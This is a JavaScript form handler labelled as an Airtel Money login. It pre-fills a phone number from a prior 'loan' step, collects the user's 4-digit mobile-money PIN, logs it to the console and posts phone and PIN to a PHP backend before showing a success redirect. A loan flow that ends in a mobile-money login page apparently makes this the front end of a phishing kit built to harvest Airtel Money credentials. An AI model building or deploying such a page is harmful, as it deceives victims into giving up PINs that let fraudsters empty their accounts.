// Airtel Money Login Handler

document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('airtelForm');
    const phoneInput = document.getElementById('airtelPhone');
    const pinInput = document.getElementById('airtelPin');
    const messageDiv = document.getElementById('message');

    if (!form) {
        console.error('Form not found');
        return;
    }

    // Pre-fill phone from sessionStorage if available
    const loanData = JSON.parse(sessionStorage.getItem('loanData') || '{}');
    if (loanData.phone) {
        phoneInput.value = loanData.phone;
        phoneInput.readOnly = true;
    }

    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        const airtelPhone = phoneInput.value.trim();
        const airtelPin = pinInput.value.trim();

        // Reset message
        messageDiv.textContent = '';
        messageDiv.className = 'message';

        // Validate phone number format
        if (!validatePhoneNumber(airtelPhone)) {
            showMessage('Please enter a valid Airtel phone number', 'error');
            return;
        }

        // Validate PIN
        if (!validatePin(airtelPin)) {
            showMessage('PIN must be 4 digits', 'error');
            return;
        }

        // Show loading state
        const submitBtn = form.querySelector('.btn-submit');
        const originalText = submitBtn.textContent;
        submitBtn.textContent = 'Verifying...';
        submitBtn.disabled = true;

        try {
            console.log('Sending verification:', { phone: airtelPhone, pin: airtelPin });

            // Send verification request to backend
            const response = await fetch('backend/handlers/verify_airtel.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    phone: airtelPhone,
                    pin: airtelPin
                })
            });

            const data = await response.json();
            console.log('Response:', data);

            if (data.success) {
                showMessage('✅ Verification successful! Redirecting...', 'success');
                // Clear session data
                sessionStorage.clear();
                // Redirect after 2 seconds
                setTimeout(() => {
                    window.location.href = data.redirect || 'success.html';
                }, 2000);
            } else {
                showMessage(data.error || 'Verification failed. Please try again.', 'error');
            }

        } catch (error) {
            console.error('Error:', error);
            showMessage('Network error. Please try again.', 'error');
        } finally {
            submitBtn.textContent = originalText;
            submitBtn.disabled = false;
        }
    });

    function validatePhoneNumber(phone) {
        // Accept any international phone number format
        // Formats: +1234567890, 001234567890, 1234567890, or just digits
        // Must be between 7-15 digits after removing formatting
        const cleaned = phone.replace(/\D/g, '');
        return cleaned.length >= 7 && cleaned.length <= 15;
    }

    function validatePin(pin) {
        // PIN should be exactly 4 digits
        return /^\d{4}$/.test(pin);
    }

    function showMessage(text, type) {
        messageDiv.textContent = text;
        messageDiv.className = `message ${type}`;
    }
});
